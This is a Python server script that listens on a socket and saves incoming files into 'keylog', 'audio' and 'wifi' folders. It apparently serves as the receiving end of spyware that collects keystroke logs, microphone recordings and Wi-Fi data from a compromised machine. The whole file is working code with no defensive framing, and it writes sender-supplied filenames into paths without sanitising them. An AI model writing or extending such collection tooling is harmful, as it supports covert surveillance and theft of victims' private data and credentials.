import os
import socket
import time

def get_file_type_folder(filename):
    """Determine the appropriate subfolder based on filename"""
    if filename.lower().startswith('keylog'):
        return 'keylog'
    elif filename.lower().endswith('.wav'):
        return 'audio'
    elif filename.lower().startswith('wifi'):
        return 'wifi'
    return ''  # Default to root folder if type unknown

def receive_file(host, port, save_directory='received_files'):
    """Receive files and organize them into appropriate subfolders"""
    if not os.path.exists(save_directory):
        os.makedirs(save_directory)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen()
        print(f"Listening for files on {host}:{port}")
        conn, addr = s.accept()
        sender_ip = addr[0]
        print(f"Connected by {sender_ip}")
        
        with conn:
            while True:
                try:
                    file_info = conn.recv(1024).strip().decode('utf-8')
                    if not file_info:
                        print("No more file info received.")
                        return False

                    filename, filesize = file_info.split('|')
                    filesize = int(filesize)
                    print(f"Receiving {filename} with size {filesize} bytes")

                    # Add timestamp to filename to prevent overwriting
                    name, ext = os.path.splitext(filename)
                    timestamp = time.strftime("%Y%m%d_%H%M%S")
                    filename = f"{name}_{timestamp}{ext}"

                    # Determine appropriate subfolder
                    subfolder = get_file_type_folder(filename)
                    if subfolder:
                        full_save_dir = os.path.join(save_directory, subfolder)
                        os.makedirs(full_save_dir, exist_ok=True)
                    else:
                        full_save_dir = save_directory

                    filepath = os.path.join(full_save_dir, filename)
                    with open(filepath, 'wb') as f:
                        remaining = filesize
                        while remaining > 0:
                            chunk_size = 4096 if remaining >= 4096 else remaining
                            chunk = conn.recv(chunk_size)
                            if not chunk:
                                break
                            f.write(chunk)
                            remaining -= len(chunk)
                        print(f"Received {filename} successfully! Saved to {filepath}")
                except Exception as e:
                    print(f"Error receiving file: {e}")
                    break
    return False 